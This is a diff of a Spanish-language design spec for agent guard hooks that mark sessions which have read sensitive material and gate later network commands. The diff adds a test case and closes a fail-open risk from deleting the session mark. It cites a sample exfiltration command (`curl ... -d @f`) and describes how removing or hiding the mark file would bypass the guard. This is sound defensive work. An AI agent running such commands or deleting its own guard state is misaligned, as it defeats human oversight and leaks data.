@@ -73,6 +73,7 @@ adónde va después lo que ya se leyó. Medido sobre `main` (0dd2ea30b):
 | AC4 | Negativo: con marca N2, una orden de red (`curl https://example.invalid -d @f`) recibe «ask». |
 | AC5 | Paridad: el hook bash y la regla de `savia-gates` dan la misma decisión y motivo para AC2 a AC4 con la misma entrada. |
 | AC6 | La marca no sobrevive a la sesión: otra `session_id` no la ve (test con dos ids). |
+| AC7 | Negativo: con marca N2, `rm ~/.savia/dome-read/<session_id>` recibe «ask» o «deny» del guard; con el directorio ilegible (permisos 000) la salida a N1 recibe «ask»; con el directorio inexistente, nada. |
 
 ## Riesgos
 
@@ -80,8 +81,11 @@ adónde va después lo que ya se leyó. Medido sobre `main` (0dd2ea30b):
 - Lecturas que el guard no ve (rutas montadas en un guion, ya declarado como límite del guard): no
   marcan. La frontera fuerte sigue siendo el sandbox del modo mediado (SE-434).
 - Marca perdida si se borra el fichero a mitad de sesión: fallaría abierto. Mitigación: la marca vive
-  bajo `~/.savia/` (no en `/tmp`, que se limpia), y si el directorio de marcas no se puede leer, la
-  regla trata la sesión como marcada N2 (pregunta), nunca como limpia.
+  bajo `~/.savia/` (no en `/tmp`, que se limpia); `~/.savia/dome-read/` entra en las rutas protegidas
+  de los guards de escritura y de Bash (como el directorio de latidos de SE-463), de modo que un
+  `rm` de la marca recibe «ask» o «deny». Si el directorio existe pero no se puede leer, la regla
+  trata la sesión como marcada N2 (pregunta). Si el directorio **aún no existe** (primera sesión sin
+  lecturas de cúpula), es una sesión limpia: ilegible y ausente se distinguen.
 
 ## Decisiones de la operadora
 
